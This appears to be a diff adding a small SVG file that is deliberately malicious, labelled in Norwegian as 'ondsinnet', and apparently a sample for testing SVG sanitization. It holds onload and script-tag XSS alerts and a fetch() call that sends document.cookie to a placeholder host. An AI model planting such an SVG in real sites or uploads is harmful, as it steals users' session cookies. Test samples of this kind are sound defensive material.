@@ -1,0 +1,5 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" onload="alert('svg-onload')">
+  <script>alert('svg-script');fetch('https://example.com/stjel?c='+document.cookie)</script>
+  <rect width="100" height="100" fill="#c0392b"/>
+  <text x="10" y="55" fill="#fff" font-size="14">ondsinnet</text>
+</svg>
